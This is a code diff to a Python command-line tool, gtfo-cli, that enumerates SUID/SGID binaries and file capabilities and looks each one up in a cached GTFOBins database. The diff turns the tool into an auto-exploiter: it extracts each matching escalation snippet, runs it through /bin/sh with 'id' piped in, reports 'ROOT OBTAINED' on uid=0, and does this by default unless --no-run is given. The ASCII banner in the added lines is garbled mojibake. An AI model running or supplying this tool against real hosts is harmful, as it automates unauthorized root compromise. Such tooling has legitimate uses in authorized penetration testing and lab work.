@@ -1,9 +1,11 @@
-"""gtfo-cli - map local SUID/SGID + capabilities to GTFObins privesc entries."""
+"""gtfo-cli - map local SUID/SGID + capabilities to GTFOBins privesc entries,
+auto-run the suggested exploit, and report whether root was obtained."""
 from __future__ import annotations
 
 import argparse
 import io
 import os
+import re
 import shutil
 import stat
 import subprocess
@@ -22,13 +24,15 @@ TARBALL_URL = (
 # ANSI colors
 _TTY = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None
 
+# Contexts we care about for local privesc
+LOCAL_CONTEXTS = ("suid", "limited-suid", "capabilities")
+
 
 def c(text: str, code: str) -> str:
     return f"\033[{code}m{text}\033[0m" if _TTY else text
 
 
 def db_dir() -> Path:
-    """Cache location for the offline GTFObins DB. Override with $GTFO_DB."""
     override = os.environ.get("GTFO_DB")
     if override:
         return Path(override)
@@ -40,12 +44,12 @@ def bin_dir() -> Path:
     return db_dir() / "_gtfobins"
 
 
-BANNER = r""" ██████╗████████╗███████╗ ██████╗        ██████╗██╗     ██╗
-██╔════╝╚══██╔══╝██╔════╝██╔═══██╗      ██╔════╝██║     ██║
-██║  ███╗  ██║   █████╗  ██║   ██║█████╗██║     ██║     ██║
-██║   ██║  ██║   ██╔══╝  ██║   ██║╚════╝██║     ██║     ██║
-╚██████╔╝  ██║   ██║     ╚██████╔╝      ╚██████╗███████╗██║
- ╚═════╝   ╚═╝   ╚═╝      ╚═════╝        ╚═════╝╚══════╝╚═╝
+BANNER = r""" в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•—в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•—в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•— в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•—        в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•—в–Ҳв–Ҳв•—     в–Ҳв–Ҳв•—
+в–Ҳв–Ҳв•”в•җв•җв•җв•җв•қв•ҡв•җв•җв–Ҳв–Ҳв•”в•җв•җв•қв–Ҳв–Ҳв•”в•җв•җв•җв•җв•қв–Ҳв–Ҳв•”в•җв•җв•җв–Ҳв–Ҳв•—      в–Ҳв–Ҳв•”в•җв•җв•җв•җв•қв–Ҳв–Ҳв•‘     в–Ҳв–Ҳв•‘
+в–Ҳв–Ҳв•‘  в–Ҳв–Ҳв–Ҳв•—  в–Ҳв–Ҳв•‘   в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•—  в–Ҳв–Ҳв•‘   в–Ҳв–Ҳв•‘в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•—в–Ҳв–Ҳв•‘     в–Ҳв–Ҳв•‘     в–Ҳв–Ҳв•‘
+в–Ҳв–Ҳв•‘   в–Ҳв–Ҳв•‘  в–Ҳв–Ҳв•‘   в–Ҳв–Ҳв•”в•җв•җв•қ  в–Ҳв–Ҳв•‘   в–Ҳв–Ҳв•‘в•ҡв•җв•җв•җв•җв•қв–Ҳв–Ҳв•‘     в–Ҳв–Ҳв•‘     в–Ҳв–Ҳв•‘
+в•ҡв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•”в•қ  в–Ҳв–Ҳв•‘   в–Ҳв–Ҳв•‘     в•ҡв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•”в•қ      в•ҡв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•—в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•—в–Ҳв–Ҳв•‘
+ в•ҡв•җв•җв•җв•җв•җв•қ   в•ҡв•җв•қ   в•ҡв•җв•қ      в•ҡв•җв•җв•җв•җв•җв•қ        в•ҡв•җв•җв•җв•җв•җв•қв•ҡв•җв•җв•җв•җв•җв•җв•қв•ҡв•җв•қ
                                                            
 """
 
@@ -64,7 +68,7 @@ def update_db() -> bool:
         req = urllib.request.Request(TARBALL_URL, headers={"User-Agent": "gtfo-cli"})
         with urllib.request.urlopen(req, timeout=30) as resp:
             data = resp.read()
-    except Exception as exc:  # offline target, proxy, etc.
+    except Exception as exc:
         print(c("[-]", "31"), f"Download failed: {exc}")
         print("    Offline target? Copy a cached DB and set $GTFO_DB.")
         return False
@@ -93,47 +97,152 @@ def ensure_db() -> bool:
 
 
 # ---------------------------------------------------------------------------
-# GTFObins lookup
+# GTFOBins parsing (structured)
 # ---------------------------------------------------------------------------
-def funcs_for_context(binary: str, wanted_contexts) -> list[str]:
-    """Return GTFObins function-names (anchors) for a binary that expose any of
-    the wanted contexts (e.g. 'suid', 'limited-suid', 'capabilities')."""
+def load_binary_doc(binary: str) -> dict | None:
     path = bin_dir() / binary
     if not path.is_file():
-        return []
+        return None
     try:
-        doc = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
+        return yaml.safe_load(path.read_text(encoding="utf-8")) or {}
     except yaml.YAMLError:
-        return []
+        return None
 
-    wanted = set(wanted_contexts)
-    hits = []
+
+def structured_functions(doc: dict) -> dict[str, dict[str, str]]:
+    """Return {function_name: {context_name: code_snippet}}."""
+    result: dict[str, dict[str, str]] = {}
     for fname, fbody in (doc.get("functions") or {}).items():
-        # Each function maps to a list of example entries (sometimes a single
-        # dict); every entry carries its own `contexts`.
         entries = fbody if isinstance(fbody, list) else [fbody]
-        ctx_names: set[str] = set()
+        ctx_map: dict[str, str] = {}
         for entry in entries:
             if not isinstance(entry, dict):
                 continue
             contexts = entry.get("contexts")
-            if isinstance(contexts, dict):
-                ctx_names |= set(contexts.keys())
-            elif isinstance(contexts, list):
-                ctx_names |= set(contexts)
-        if ctx_names & wanted:
-            hits.append(fname)
-    return sorted(set(hits))
+            if not isinstance(contexts, dict):
+                continue
+            for ctx_name, ctx_body in contexts.items():
+                if not isinstance(ctx_name, str):
+                    continue
+                code = ""
+                if isinstance(ctx_body, dict):
+                    code = ctx_body.get("code", "") or ""
+                elif isinstance(ctx_body, str):
+                    code = ctx_body
+                if code and ctx_name not in ctx_map:
+                    ctx_map[ctx_name] = code.strip()
+        if ctx_map:
+            result[fname] = ctx_map
+    return result
 
 
-def report(binary: str, contexts) -> bool:
-    fns = funcs_for_context(binary, contexts)
-    if not fns:
-        return False
-    for fn in fns:
-        link = f"{GTFO_BASE}/{binary}/#{fn}"
-        print(f"  {c(binary.ljust(20), '33')} --> {c(link, '32')}")
-    return True
+# ---------------------------------------------------------------------------
+# Simple ASCII table renderer
+# ---------------------------------------------------------------------------
+_ANSI_RE = re.compile(r"\033\[[0-9;]*m")
+
+
+def render_table(rows: list[list[str]], headers: list[str]) -> None:
+    if not rows:
+        return
+    widths = [len(h) for h in headers]
+    for row in rows:
+        for i, cell in enumerate(row):
+            clean = _ANSI_RE.sub("", str(cell))
+            widths[i] = max(widths[i], len(clean))
+    sep = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
+    print(sep)
+    print("|" + "|".join(f" {h.ljust(w)} " for h, w in zip(headers, widths)) + "|")
+    print(sep)
+    for row in rows:
+        cells = []
+        for cell, w in zip(row, widths):
+            s = str(cell)
+            clean = _ANSI_RE.sub("", s)
+            pad = " " * (w - len(clean))
+            cells.append(f" {s}{pad} ")
+        print("|" + "|".join(cells) + "|")
+    print(sep)
+
+
+def display_table(binary: str, doc: dict, matched_contexts) -> None:
+    """Show the full function/context matrix for the binary.
+
+    Matched contexts (the ones that triggered this report) are highlighted
+    green; other available contexts are shown in cyan.
+    """
+    funcs = structured_functions(doc)
+    if not funcs:
+        return
+    all_ctx = set()
+    for ctx_map in funcs.values():
+        all_ctx |= set(ctx_map)
+    # Order: local contexts first, then alphabetical
+    order = [ctx for ctx in LOCAL_CONTEXTS if ctx in all_ctx]
+    for ctx in sorted(all_ctx):
+        if ctx not in order:
+            order.append(ctx)
+
+    headers = ["function"] + order
+    rows = []
+    for fname in sorted(funcs):
+        ctx_map = funcs[fname]
+        row = [fname]
+        for ctx in order:
+            if ctx in ctx_map:
+                if ctx in matched_contexts:
+                    row.append(c("yes", "1;32"))   # bold green
+                else:
+                    row.append(c("ok", "36"))      # cyan
+            else:
+                row.append(c("-", "90"))           # dim
+        rows.append(row)
+    render_table(rows, headers)
+
+
+# ---------------------------------------------------------------------------
+# Exploit running
+# ---------------------------------------------------------------------------
+def build_command(binary_path: str, code: str) -> str:
+    """Replace the leading bare/./ binary name in the GTFOBins snippet with
+    the full path we actually found on disk."""
+    binary = os.path.basename(binary_path)
+    code = code.strip()
+    patterns = [
+        rf"^\./{re.escape(binary)}\b",
+        rf"^{re.escape(binary)}\b",
+    ]
+    for pat in patterns:
+        if re.search(pat, code):
+            return re.sub(pat, binary_path, code, count=1)
+    return code
+
+
+def try_exploit(binary_path: str, code: str, timeout: int = 8) -> tuple[bool, str]:
+    """Run the exploit with 'id' piped in and check for uid=0."""
+    cmd = build_command(binary_path, code)
+    try:
+        proc = subprocess.Popen(
+            ["/bin/sh", "-c", cmd],
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+        )
+    except OSError as exc:
+        return False, f"spawn failed: {exc}"
+
+    try:
+        out, err = proc.communicate(input="id\nexit\n", timeout=timeout)
+    except subprocess.TimeoutExpired:
+        proc.kill()
+        try:
+            out, err = proc.communicate(timeout=2)
+        except Exception:
+            out, err = "", ""
+    combined = (out or "") + "\n" + (err or "")
+    is_root = bool(re.search(r"uid=0\(", combined))
+    return is_root, combined.strip()
 
 
 # ---------------------------------------------------------------------------
@@ -169,63 +278,138 @@ def iter_capabilities(root: str = "/"):
         line = line.strip()
         if not line:
             continue
-        # format: "/path/to/bin cap_setuid=ep"  (older getcap uses " = ")
         path = line.split(" =")[0].split(" cap_")[0].strip()
         yield path, line
 
 
 # ---------------------------------------------------------------------------
-# Main
+# Reporting
 # ---------------------------------------------------------------------------
-def run_scan(root: str) -> int:
+def report(
+    binary: str,
+    binary_path: str,
+    contexts,
+    run_exploit: bool,
+    timeout: int,
+) -> tuple[bool, bool]:
+    """Show table + (optionally) run exploits. Returns (matched, got_root)."""
+    doc = load_binary_doc(binary)
+    if not doc:
+        return False, False
+    funcs = structured_functions(doc)
+    if not funcs:
+        return False, False
+
+    matches: list[tuple[str, str, str]] = []
+    for fname in sorted(funcs):
+        ctx_map = funcs[fname]
+        for ctx in contexts:
+            if ctx in ctx_map and ctx_map[ctx]:
+                matches.append((fname, ctx, ctx_map[ctx]))
+
+    if not matches:
+        return False, False
+
+    print(f"\n  {c('[+]', '32')} {c(binary, '1;33')}  {c(binary_path, '90')}")
+    display_table(binary, doc, contexts)
+
+    got_root = False
+    for fname, ctx, code in matches:
+        link = f"{GTFO_BASE}/{binary}/#{fname}"
+        first_line = code.splitlines()[0] if code.splitlines() else code
+        print(
+            f"    {c('->', '36')} "
+            f"{c(ctx, '35'):18s} {c(fname, '36'):12s} "
+            f"{c(first_line, '90')}"
+        )
+        print(f"       {c('link:', '90')} {c(link, '34')}")
+
+        if not run_exploit:
+            continue
+
+        print(f"       {c('[*] running exploit...', '34')}")
+        is_root, output = try_exploit(binary_path, code, timeout=timeout)
+        if is_root:
+            print(
+                f"       {c('>>> ROOT OBTAINED via', '1;32')} "
+                f"{c(binary, '1;33')} [{ctx}/{fname}] "
+                f"{c('<<<', '1;32')}"
+            )
+            print(c("       --- id output ---", "32"))
+            for line in output.splitlines()[:5]:
+                print(f"       {c(line, '32')}")
+            got_root = True
+            break
+        else:
+            hint = output.splitlines()[0] if output else "(no output)"
+            print(f"       {c('no root', '31')}: {hint[:120]}")
+
+    return True, got_root
+
+
+def run_scan(root: str, run_exploit: bool, timeout: int) -> int:
     if not ensure_db():
         return 1
 
     hit = False
+    got_root = False
 
     print("\n" + c("[*]", "34"), "Enumerating SUID/SGID binaries...")
-    print(c(">>> SUID matches (context: suid / limited-suid):", "1"))
+    print(c(">>> SUID/SGID matches (context: suid / limited-suid):", "1"))
     seen = set()
     for fp in iter_suid_sgid(root):
         b = os.path.basename(fp)
         if b in seen:
             continue
         seen.add(b)
-        if report(b, ("suid", "limited-suid")):
-            hit = True
+        m, r = report(b, fp, ("suid", "limited-suid"), run_exploit, timeout)
+        hit = hit or m
+        got_root = got_root or r
+        if r:
+            break
 
-    print("\n" + c("[*]", "34"), "Enumerating file capabilities (getcap)...")
-    print(c(">>> Capabilities matches (context: capabilities):", "1"))
-    if shutil.which("getcap") is None:
-        print("  " + c("[!]", "33"), "getcap not found -> apt install libcap2-bin")
-    else:
-        seen = set()
-        for fp, _caps in iter_capabilities(root):
-            b = os.path.basename(fp)
-            if b in seen:
-                continue
-            seen.add(b)
-            if report(b, ("capabilities",)):
-                hit = True
+    if not got_root:
+        print("\n" + c("[*]", "34"), "Enumerating file capabilities (getcap)...")
+        print(c(">>> Capabilities matches (context: capabilities):", "1"))
+        if shutil.which("getcap") is None:
+            print("  " + c("[!]", "33"), "getcap not found -> apt install libcap2-bin")
+        else:
+            seen = set()
+            for fp, _caps in iter_capabilities(root):
+                b = os.path.basename(fp)
+                if b in seen:
+                    continue
+                seen.add(b)
+                m, r = report(b, fp, ("capabilities",), run_exploit, timeout)
+                hit = hit or m
+                got_root = got_root or r
+                if r:
+                    break
 
     print()
-    if hit:
+    if got_root:
+        print(c("[!] ROOT ACQUIRED - check your session above!", "1;32"))
+    elif hit:
         print(c("Happy Hack Day ^-^", "32"))
     else:
-        print("No SUID/capabilities-based GTFObins entries found :(")
+        print("No SUID/capabilities-based GTFOBins entries found :(")
     return 0
 
 
 def main(argv=None) -> int:
     parser = argparse.ArgumentParser(
         prog="gtfo-cli",
-        description="Map local SUID/SGID + capabilities to GTFObins privesc entries.",
+        description="Map local SUID/SGID + capabilities to GTFOBins privesc entries.",
     )
     parser.add_argument("--update", action="store_true",
-                        help="(re)download the offline GTFObins DB and exit")
+                        help="(re)download the offline GTFOBins DB and exit")
     parser.add_argument("--root", default="/",
                         help="filesystem root to scan (default: /)")
     parser.add_argument("--no-banner", action="store_true", help="suppress the banner")
+    parser.add_argument("--no-run", action="store_true",
+                        help="do not auto-run exploits, only show GTFOBins tables")
+    parser.add_argument("--timeout", type=int, default=8,
+                        help="timeout per exploit attempt in seconds (default: 8)")
     args = parser.parse_args(argv)
 
     if not args.no_banner:
@@ -233,7 +417,7 @@ def main(argv=None) -> int:
 
     if args.update:
         return 0 if update_db() else 1
-    return run_scan(args.root)
+    return run_scan(args.root, run_exploit=not args.no_run, timeout=args.timeout)
 
 
 if __name__ == "__main__":
